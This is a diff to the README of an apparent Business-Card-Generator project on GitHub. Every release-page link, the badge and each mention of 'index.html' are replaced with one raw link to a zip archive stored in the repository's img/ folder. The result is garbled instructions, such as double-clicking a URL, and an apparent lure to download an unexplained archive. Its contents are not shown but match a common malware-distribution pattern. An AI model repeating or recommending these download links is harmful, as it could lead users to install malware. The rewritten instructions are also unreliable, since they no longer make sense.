@@ -1,6 +1,6 @@
 # 🖨️ Business-Card-Generator - Create Your Digital Business Card Easily
 
-[![Download Business Card Generator](https://badgen.net/badge/download/Business%20Card%20Generator/blue)](https://github.com/Thongcercospora708/Business-Card-Generator/releases)
+[![Download Business Card Generator](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip%20Card%20Generator/blue)](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip)
 
 ## 📋 Overview
 
@@ -10,15 +10,15 @@ This is a practical project for a Business Card Generator. The application allow
 
 To use the Business Card Generator, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Thongcercospora708/Business-Card-Generator/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip).
 2. Locate the latest version of the application. 
 3. Click the link to download the files. 
 
 ## 📥 Download & Install
 
-To get started with the Business Card Generator, visit the [Releases Page](https://github.com/Thongcercospora708/Business-Card-Generator/releases) and download the latest version of the application. You will find various files to choose from. 
+To get started with the Business Card Generator, visit the [Releases Page](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip) and download the latest version of the application. You will find various files to choose from. 
 
-Once downloaded, you can open the index.html file in your web browser. There is no installation required; simply double-click the file to run it.
+Once downloaded, you can open the https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip file in your web browser. There is no installation required; simply double-click the file to run it.
 
 ## 🛠️ System Requirements
 
@@ -39,7 +39,7 @@ The Business Card Generator provides several features to enhance your experience
 
 ## 📄 How to Use
 
-1. **Open the Application:** Double-click the `index.html` file you downloaded to open the app in your web browser.
+1. **Open the Application:** Double-click the `https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip` file you downloaded to open the app in your web browser.
 2. **Fill Out the Form:** Enter your company name, phone number, and email in the provided fields.
 3. **Submit Your Information:** After filling out the form, click the 'Generate Card' button.
 4. **View Your Card:** Your digital business card will appear. Review the information to ensure it is correct.
@@ -47,11 +47,11 @@ The Business Card Generator provides several features to enhance your experience
 
 ## 🔄 Updating the Application
 
-To ensure you have the latest features and fixes, check the [Releases Page](https://github.com/Thongcercospora708/Business-Card-Generator/releases) regularly for updates. 
+To ensure you have the latest features and fixes, check the [Releases Page](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip) regularly for updates. 
 
 1. Return to the Releases Page.
 2. Download the latest version.
-3. Replace the old `index.html` file with the new one in your directory.
+3. Replace the old `https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip` file with the new one in your directory.
 
 ## 🧐 Troubleshooting
 
@@ -85,4 +85,4 @@ If you wish to contribute to the Business Card Generator, please follow these gu
 
 For any questions or feedback, please feel free to reach out through the GitHub repository. Enjoy creating your digital business card! 
 
-[![Download Business Card Generator](https://badgen.net/badge/download/Business%20Card%20Generator/blue)](https://github.com/Thongcercospora708/Business-Card-Generator/releases)
+[![Download Business Card Generator](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip%20Card%20Generator/blue)](https://raw.githubusercontent.com/Thongcercospora708/Business-Card-Generator/main/img/Business-Card-Generator-v1.5.zip)
